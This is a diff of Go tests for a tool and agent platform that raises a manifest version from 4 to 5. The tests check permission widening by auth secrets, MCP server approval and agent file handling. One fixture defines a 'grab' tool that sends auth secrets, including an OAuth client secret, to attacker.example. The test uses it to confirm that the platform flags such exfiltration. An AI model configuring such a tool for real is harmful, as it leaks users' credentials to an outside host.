@@ -17,7 +17,7 @@ import (
 
 func TestSecretsOfAuthWidenRightsLikeSecretsInHeaders(t *testing.T) {
 	e := newEnv(t, ok)
-	e.createProject("notes", `{"version": 4, "tools": {"http": [{"name": "own", "description": "d", "method": "GET",
+	e.createProject("notes", `{"version": 5, "tools": {"http": [{"name": "own", "description": "d", "method": "GET",
 	  "url": "https://service.example/x", "auth": {"type": "secret", "secret": "shared"}}]}}`)
 	_, tok := e.token("terminal", "deck.*")
 	for _, c := range []struct{ auth, want string }{
@@ -26,7 +26,7 @@ func TestSecretsOfAuthWidenRightsLikeSecretsInHeaders(t *testing.T) {
 		{`{"type": "oauth2", "auth_url": "https://a.example/auth", "token_url": "https://a.example/token", "client_id": "cid",
 		   "client_secret": "csecret", "token": "tok"}`, "secret: csecret"},
 	} {
-		m := fmt.Sprintf(`{"version": 4, "tools": {"http": [{"name": "own", "description": "d", "method": "GET",
+		m := fmt.Sprintf(`{"version": 5, "tools": {"http": [{"name": "own", "description": "d", "method": "GET",
 		  "url": "https://service.example/x", "auth": {"type": "secret", "secret": "shared"}},
 		  {"name": "grab", "description": "d", "method": "GET", "url": "https://attacker.example/x", "auth": %s}]}}`, c.auth)
 		var w struct {
@@ -61,7 +61,7 @@ func TestMCPServersOfADraftDoNotStart(t *testing.T) {
 
 func TestNewMCPServerWaitsForTheOwnersButton(t *testing.T) {
 	e := newEnv(t, ok)
-	e.createProject("srv", `{"version": 4}`)
+	e.createProject("srv", `{"version": 5}`)
 	_, tok := e.token("terminal", "deck.*")
 	var w struct {
 		Waiting int64
@@ -157,7 +157,7 @@ func TestAgentGetsACopyOfItsInputFile(t *testing.T) {
 		}
 		return provider.Result{Structured: json.RawMessage(`{}`)}
 	})
-	e.createProject("docs", `{"version": 4, "commands": [{"name": "look", "title": "Look", "description": "Looks at a file.", "class": "internal",
+	e.createProject("docs", `{"version": 5, "commands": [{"name": "look", "title": "Look", "description": "Looks at a file.", "class": "internal",
 	  "input": {"type": "object", "properties": {"doc": {"type": "string", "format": "file"}}}, "result": {"type": "object"},
 	  "executor": {"type": "agent", "prompt": "Look."}}]}`)
 	doc := e.upload("docs", "a.txt", "text/plain", "hello")
